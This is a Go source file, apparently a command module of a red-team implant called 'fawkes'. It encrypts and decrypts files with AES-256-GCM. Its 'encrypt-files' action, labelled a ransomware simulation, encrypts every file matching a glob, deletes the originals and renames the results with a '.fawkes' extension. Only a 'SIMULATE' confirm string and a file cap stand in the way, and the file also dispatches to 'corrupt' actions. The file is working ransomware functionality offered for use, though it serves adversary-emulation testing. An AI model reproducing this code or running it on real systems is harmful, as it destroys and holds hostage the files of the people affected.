package commands

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type EncryptCommand struct{}

func (c *EncryptCommand) Name() string { return "encrypt" }
func (c *EncryptCommand) Description() string {
	return "Encrypt or decrypt files using AES-256-GCM for secure data staging"
}

type encryptArgs struct {
	Action   string `json:"action"`    // encrypt, decrypt, encrypt-files, decrypt-files
	Path     string `json:"path"`      // input file path or glob pattern
	Output   string `json:"output"`    // output file path (optional, single file only)
	Key      string `json:"key"`       // base64-encoded key (auto-generated for encrypt if empty)
	Confirm  string `json:"confirm"`   // safety gate for encrypt-files ("SIMULATE")
	MaxFiles int    `json:"max_files"` // max files for batch mode (default 100)
}

const (
	encryptMaxFileSize = 500 * 1024 * 1024 // 500MB
	aes256KeySize      = 32                // 256 bits
)

func (c *EncryptCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required (action, path). Actions: encrypt, decrypt")
	}

	var args encryptArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		// Parse "encrypt /path/file" or "decrypt /path/file"
		parts := strings.Fields(task.Params)
		if len(parts) >= 2 {
			args.Action = parts[0]
			args.Path = parts[1]
		} else if len(parts) == 1 {
			args.Path = parts[0]
		}
	}

	if args.Path == "" {
		return errorResult("Error: path is required")
	}

	if abs, err := filepath.Abs(args.Path); err == nil {
		args.Path = abs
	}

	switch args.Action {
	case "encrypt":
		return encryptFile(args)
	case "decrypt":
		return decryptFile(args)
	case "encrypt-files":
		return encryptFiles(args)
	case "decrypt-files":
		return decryptFiles(args)
	case "corrupt":
		return corruptFile(args)
	case "corrupt-files":
		return corruptFiles(args)
	default:
		return errorResult("Error: action must be encrypt, decrypt, encrypt-files, decrypt-files, corrupt, or corrupt-files")
	}
}

func encryptFile(args encryptArgs) structs.CommandResult {
	// Read input file
	info, err := os.Stat(args.Path)
	if err != nil {
		return errorf("Error: %v", err)
	}
	if info.Size() > encryptMaxFileSize {
		return errorf("Error: file too large (%d bytes, max %d)", info.Size(), encryptMaxFileSize)
	}

	plaintext, err := os.ReadFile(args.Path)
	if err != nil {
		return errorf("Error reading file: %v", err)
	}
	defer structs.ZeroBytes(plaintext) // opsec: clear plaintext from memory

	// Get or generate key
	var key []byte
	if args.Key != "" {
		key, err = base64.StdEncoding.DecodeString(args.Key)
		if err != nil {
			return errorf("Error decoding key: %v", err)
		}
		if len(key) != aes256KeySize {
			return errorf("Error: key must be %d bytes (got %d)", aes256KeySize, len(key))
		}
	} else {
		key = make([]byte, aes256KeySize)
		if _, err := io.ReadFull(rand.Reader, key); err != nil {
			return errorf("Error generating key: %v", err)
		}
	}
	defer structs.ZeroBytes(key) // opsec: clear key material from memory

	// Encrypt with AES-256-GCM
	block, err := aes.NewCipher(key)
	if err != nil {
		return errorf("Error creating cipher: %v", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return errorf("Error creating GCM: %v", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return errorf("Error generating nonce: %v", err)
	}

	// Output format: nonce + ciphertext (GCM tag appended by Seal)
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

	// Determine output path
	outPath := args.Output
	if outPath == "" {
		outPath = args.Path + ".enc"
	}
	if abs, err := filepath.Abs(outPath); err == nil {
		outPath = abs
	}

	if err := os.WriteFile(outPath, ciphertext, 0600); err != nil {
		return errorf("Error writing encrypted file: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Encrypted: %s → %s\n", args.Path, outPath))
	sb.WriteString("Algorithm: AES-256-GCM\n")
	sb.WriteString(fmt.Sprintf("Key (base64): %s\n", base64.StdEncoding.EncodeToString(key)))
	sb.WriteString(fmt.Sprintf("Input size:  %d bytes\n", len(plaintext)))
	sb.WriteString(fmt.Sprintf("Output size: %d bytes\n", len(ciphertext)))
	sb.WriteString("\n⚠ Save the key — it is required for decryption")

	return successResult(sb.String())
}

const fawkesEncExt = ".fawkes"

// encryptFiles performs batch file encryption by glob pattern (T1486 ransomware simulation).
// Safety: requires -confirm SIMULATE and enforces max_files limit.
func encryptFiles(args encryptArgs) structs.CommandResult {
	if args.Confirm != "SIMULATE" {
		return errorResult("Error: encrypt-files requires -confirm SIMULATE (safety gate for ransomware simulation)")
	}
	if args.Path == "" {
		return errorResult("Error: path glob pattern required (e.g., '/home/user/Documents/*.docx')")
	}

	maxFiles := args.MaxFiles
	if maxFiles <= 0 {
		maxFiles = 100
	}

	// Expand glob pattern
	matches, err := filepath.Glob(args.Path)
	if err != nil {
		return errorf("Error: invalid glob pattern: %v", err)
	}

	// Filter to regular files only
	var files []string
	for _, m := range matches {
		info, err := os.Stat(m)
		if err != nil || info.IsDir() || info.Size() > encryptMaxFileSize {
			continue
		}
		// Skip already-encrypted files
		if strings.HasSuffix(m, fawkesEncExt) {
			continue
		}
		files = append(files, m)
	}

	if len(files) == 0 {
		return errorResult("Error: no files matched the pattern (or all already encrypted)")
	}

	if len(files) > maxFiles {
		return errorf("Error: %d files match but max_files is %d. Increase max_files or narrow the pattern.", len(files), maxFiles)
	}

	// Generate a single recovery key for the entire batch
	key := make([]byte, aes256KeySize)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		return errorf("Error generating key: %v", err)
	}
	defer structs.ZeroBytes(key)

	block, err := aes.NewCipher(key)
	if err != nil {
		return errorf("Error creating cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return errorf("Error creating GCM: %v", err)
	}

	encrypted := 0
	var errors []string
	totalBytes := int64(0)

	for _, path := range files {
		plaintext, err := os.ReadFile(path)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: read error: %v", filepath.Base(path), err))
			continue
		}

		nonce := make([]byte, gcm.NonceSize())
		if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
			structs.ZeroBytes(plaintext)
			errors = append(errors, fmt.Sprintf("%s: nonce error: %v", filepath.Base(path), err))
			continue
		}

		ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
		structs.ZeroBytes(plaintext)

		outPath := path + fawkesEncExt
		if err := os.WriteFile(outPath, ciphertext, 0600); err != nil {
			errors = append(errors, fmt.Sprintf("%s: write error: %v", filepath.Base(path), err))
			continue
		}

		// Remove original file after successful encryption
		os.Remove(path)

		encrypted++
		totalBytes += int64(len(ciphertext))
	}

	var sb strings.Builder
	sb.WriteString("=== Ransomware Simulation (T1486) ===\n")
	sb.WriteString(fmt.Sprintf("Pattern: %s\n", args.Path))
	sb.WriteString(fmt.Sprintf("Files encrypted: %d/%d\n", encrypted, len(files)))
	sb.WriteString(fmt.Sprintf("Total bytes: %d\n", totalBytes))
	sb.WriteString(fmt.Sprintf("Extension: %s\n", fawkesEncExt))
	sb.WriteString("Algorithm: AES-256-GCM\n")
	sb.WriteString(fmt.Sprintf("Recovery Key (base64): %s\n", base64.StdEncoding.EncodeToString(key)))
	if len(errors) > 0 {
		sb.WriteString(fmt.Sprintf("\nErrors (%d):\n", len(errors)))
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  - %s\n", e))
		}
	}
	sb.WriteString("\n⚠ SAVE THE RECOVERY KEY — required for decrypt-files")

	return successResult(sb.String())
}

// decryptFiles reverses batch encryption by decrypting all .fawkes files in a directory.
func decryptFiles(args encryptArgs) structs.CommandResult {
	if args.Key == "" {
		return errorResult("Error: recovery key required (base64-encoded AES-256 key from encrypt-files)")
	}
	if args.Path == "" {
		return errorResult("Error: directory path required")
	}

	key, err := base64.StdEncoding.DecodeString(args.Key)
	if err != nil {
		return errorf("Error decoding key: %v", err)
	}
	defer structs.ZeroBytes(key)
	if len(key) != aes256KeySize {
		return errorf("Error: key must be %d bytes (got %d)", aes256KeySize, len(key))
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return errorf("Error creating cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return errorf("Error creating GCM: %v", err)
	}

	// Find all .fawkes files in the path (directory or glob)
	var files []string
	info, statErr := os.Stat(args.Path)
	if statErr == nil && info.IsDir() {
		// Walk directory for .fawkes files
		filepath.Walk(args.Path, func(path string, fi os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if !fi.IsDir() && strings.HasSuffix(path, fawkesEncExt) {
				files = append(files, path)
			}
			return nil
		})
	} else {
		// Try as glob pattern
		matches, _ := filepath.Glob(args.Path)
		for _, m := range matches {
			if strings.HasSuffix(m, fawkesEncExt) {
				files = append(files, m)
			}
		}
	}

	if len(files) == 0 {
		return errorResult("Error: no .fawkes files found in the specified path")
	}

	nonceSize := gcm.NonceSize()
	decrypted := 0
	var errors []string

	for _, path := range files {
		ciphertext, err := os.ReadFile(path)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: read error: %v", filepath.Base(path), err))
			continue
		}

		if len(ciphertext) < nonceSize {
			errors = append(errors, fmt.Sprintf("%s: too small (corrupted?)", filepath.Base(path)))
			continue
		}

		nonce, ct := ciphertext[:nonceSize], ciphertext[nonceSize:]
		plaintext, err := gcm.Open(nil, nonce, ct, nil)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: decrypt error (wrong key?): %v", filepath.Base(path), err))
			structs.ZeroBytes(ciphertext)
			continue
		}
		structs.ZeroBytes(ciphertext)

		// Restore original filename by removing .fawkes extension
		outPath := strings.TrimSuffix(path, fawkesEncExt)
		if err := os.WriteFile(outPath, plaintext, 0600); err != nil {
			errors = append(errors, fmt.Sprintf("%s: write error: %v", filepath.Base(path), err))
			structs.ZeroBytes(plaintext)
			continue
		}
		structs.ZeroBytes(plaintext)

		// Remove encrypted file after successful decryption
		os.Remove(path)
		decrypted++
	}

	var sb strings.Builder
	sb.WriteString("=== Ransomware Recovery ===\n")
	sb.WriteString(fmt.Sprintf("Files decrypted: %d/%d\n", decrypted, len(files)))
	if len(errors) > 0 {
		sb.WriteString(fmt.Sprintf("\nErrors (%d):\n", len(errors)))
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  - %s\n", e))
		}
	}

	return successResult(sb.String())
}

func decryptFile(args encryptArgs) structs.CommandResult {
	if args.Key == "" {
		return errorResult("Error: key is required for decryption (base64-encoded AES-256 key)")
	}

	key, err := base64.StdEncoding.DecodeString(args.Key)
	if err != nil {
		return errorf("Error decoding key: %v", err)
	}
	defer structs.ZeroBytes(key) // opsec: clear key material from memory
	if len(key) != aes256KeySize {
		return errorf("Error: key must be %d bytes (got %d)", aes256KeySize, len(key))
	}

	// Read encrypted file
	ciphertext, err := os.ReadFile(args.Path)
	if err != nil {
		return errorf("Error reading file: %v", err)
	}
	defer structs.ZeroBytes(ciphertext) // opsec: clear ciphertext from memory

	block, err := aes.NewCipher(key)
	if err != nil {
		return errorf("Error creating cipher: %v", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return errorf("Error creating GCM: %v", err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return errorResult("Error: encrypted file too small (corrupted?)")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return errorf("Error decrypting: %v (wrong key or corrupted file)", err)
	}
	defer structs.ZeroBytes(plaintext) // opsec: clear decrypted plaintext from memory

	// Determine output path
	outPath := args.Output
	if outPath == "" {
		outPath = strings.TrimSuffix(args.Path, ".enc")
		if outPath == args.Path {
			outPath = args.Path + ".dec"
		}
	}
	if abs, err := filepath.Abs(outPath); err == nil {
		outPath = abs
	}

	if err := os.WriteFile(outPath, plaintext, 0600); err != nil {
		return errorf("Error writing decrypted file: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Decrypted: %s → %s\n", args.Path, outPath))
	sb.WriteString(fmt.Sprintf("Input size:  %d bytes\n", len(ciphertext)+nonceSize))
	sb.WriteString(fmt.Sprintf("Output size: %d bytes\n", len(plaintext)))

	return successResult(sb.String())
}
